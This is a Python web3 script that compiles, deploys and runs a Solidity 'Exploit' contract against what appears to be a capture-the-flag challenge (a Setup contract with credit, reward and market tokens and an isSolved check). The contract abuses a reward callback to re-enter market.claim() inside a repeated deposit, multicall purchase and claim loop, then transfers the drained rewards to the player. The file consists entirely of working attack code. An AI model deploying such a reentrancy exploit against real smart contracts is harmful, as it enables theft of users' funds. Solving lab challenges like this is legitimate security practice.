import json
import os
import re
import shutil
import subprocess
from pathlib import Path

from web3 import Web3

RPC = os.getenv("RPC_URL", "http://127.0.0.1:8545")
KEY = os.getenv("PRIVATE_KEY") or os.getenv("PRIVKEY")
SETUP_VALUE = os.getenv("SETUP") or os.getenv("SETUP_CONTRACT_ADDR")

if not KEY or not SETUP_VALUE:
    raise SystemExit(
        "set PRIVATE_KEY (or PRIVKEY) and SETUP (or SETUP_CONTRACT_ADDR)"
    )

SETUP = Web3.to_checksum_address(SETUP_VALUE)

w3 = Web3(Web3.HTTPProvider(RPC))
if not w3.is_connected():
    raise SystemExit(f"RPC endpoint is not reachable: {RPC}")

acc = w3.eth.account.from_key(KEY)
player = acc.address

src = r"""
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

interface IERC {
    function approve(address,uint256) external returns(bool);
    function transfer(address,uint256) external returns(bool);
    function transferFrom(address,address,uint256) external returns(bool);
}

interface IReward {
    function setHook(bool) external;
    function transfer(address,uint256) external;
    function balanceOf(address) external view returns(uint256);
}

interface IMarket {
    function deposit(uint256) external;
    function multicall(bytes[] calldata) external;
    function claim() external;
}

interface ISetup {
    function credit() external view returns(address);
    function reward() external view returns(address);
    function market() external view returns(address);
    function isSolved() external view returns(bool);
}

contract Exploit {
    IERC credit;
    IReward reward;
    IMarket market;
    ISetup setup;

    uint256 constant SEED = 10_000 ether;

    constructor(address s) {
        setup = ISetup(s);
        credit = IERC(setup.credit());
        reward = IReward(setup.reward());
        market = IMarket(setup.market());
    }

    function solve() external {
        credit.transferFrom(msg.sender, address(this), SEED);
        credit.approve(address(market), type(uint256).max);

        reward.setHook(true);
        market.deposit(SEED);

        for (uint256 i; i < 10; i++) {
            bytes[] memory x = new bytes[](1);
            x[0] = abi.encodeWithSignature("purchase(uint256)", SEED);

            market.multicall(x);
            market.claim();

            if (i != 9)
                market.deposit(SEED);
        }

        reward.setHook(false);
        reward.transfer(msg.sender, reward.balanceOf(address(this)));
    }

    function onRewardReceived() external {
        require(msg.sender == address(reward));
        market.claim();
    }
}
"""

def compiler_version(path):
    result = subprocess.run(
        [str(path), "--version"],
        check=True,
        capture_output=True,
        text=True,
    )
    match = re.search(r"Version: (\d+)\.(\d+)\.(\d+)", result.stdout)
    return tuple(map(int, match.groups())) if match else None


def find_solc():
    candidates = []
    if os.getenv("SOLC"):
        candidates.append(Path(os.environ["SOLC"]))
    if shutil.which("solc"):
        candidates.append(Path(shutil.which("solc")))

    candidates.extend(
        (Path.home() / ".local/share/svm").glob("*/solc-*")
    )
    candidates.extend((Path.home() / ".solcx").glob("solc-v*"))

    compatible = []
    for candidate in dict.fromkeys(candidates):
        try:
            version = compiler_version(candidate)
        except (OSError, subprocess.SubprocessError):
            continue
        if version and (0, 8, 24) <= version < (0, 9, 0):
            compatible.append((version, candidate))

    if not compatible:
        raise SystemExit(
            "no compatible solc found (need Solidity >=0.8.24 and <0.9.0); "
            "install it with svm or set SOLC=/path/to/solc"
        )
    return max(compatible)[1]


def compile_exploit():
    compiler = find_solc()
    compiler_input = {
        "language": "Solidity",
        "sources": {"Exploit.sol": {"content": src}},
        "settings": {
            "evmVersion": "shanghai",
            "outputSelection": {
                "*": {"*": ["abi", "evm.bytecode.object"]}
            },
        },
    }
    result = subprocess.run(
        [str(compiler), "--standard-json"],
        input=json.dumps(compiler_input),
        check=True,
        capture_output=True,
        text=True,
    )
    output = json.loads(result.stdout)
    errors = [
        item["formattedMessage"]
        for item in output.get("errors", [])
        if item.get("severity") == "error"
    ]
    if errors:
        raise SystemExit("Solidity compilation failed:\n" + "\n".join(errors))

    artifact = output["contracts"]["Exploit.sol"]["Exploit"]
    return {
        "abi": artifact["abi"],
        "bin": artifact["evm"]["bytecode"]["object"],
    }


compiled = compile_exploit()

Exploit = w3.eth.contract(
    abi=compiled["abi"],
    bytecode=compiled["bin"]
)

def send(tx):
    tx["from"] = player
    tx["nonce"] = w3.eth.get_transaction_count(player)
    tx["chainId"] = w3.eth.chain_id

    base_fee = w3.eth.get_block("latest").get("baseFeePerGas")
    if base_fee is None:
        tx.setdefault("gasPrice", w3.eth.gas_price)
    else:
        priority_fee = w3.to_wei(1, "gwei")
        tx.setdefault("maxPriorityFeePerGas", priority_fee)
        tx.setdefault("maxFeePerGas", base_fee * 2 + priority_fee)
        tx.pop("gasPrice", None)

    signed = acc.sign_transaction(tx)
    h = w3.eth.send_raw_transaction(signed.raw_transaction)
    receipt = w3.eth.wait_for_transaction_receipt(h)
    if receipt.status != 1:
        raise RuntimeError(f"transaction reverted: {h.hex()}")
    return receipt

r = send(
    Exploit.constructor(SETUP).build_transaction({
        "gas": 3_000_000
    })
)

exploit = w3.eth.contract(
    address=r.contractAddress,
    abi=compiled["abi"]
)

setup_abi = [{
    "inputs": [],
    "name": "credit",
    "outputs": [{"type": "address"}],
    "stateMutability": "view",
    "type": "function"
}, {
    "inputs": [],
    "name": "isSolved",
    "outputs": [{"type": "bool"}],
    "stateMutability": "view",
    "type": "function"
}]

setup = w3.eth.contract(address=SETUP, abi=setup_abi)
credit_addr = setup.functions.credit().call()

erc20_abi = [{
    "inputs": [
        {"name": "spender", "type": "address"},
        {"name": "amount", "type": "uint256"}
    ],
    "name": "approve",
    "outputs": [{"type": "bool"}],
    "stateMutability": "nonpayable",
    "type": "function"
}]

credit = w3.eth.contract(
    address=credit_addr,
    abi=erc20_abi
)

send(
    credit.functions.approve(
        r.contractAddress,
        10_000 * 10**18
    ).build_transaction({
        "gas": 100_000
    })
)

send(
    exploit.functions.solve().build_transaction({
        "gas": 5_000_000
    })
)

print("Exploit :", r.contractAddress)
solved = setup.functions.isSolved().call()
print("Solved  :", solved)
if not solved:
    raise SystemExit("challenge is not solved")
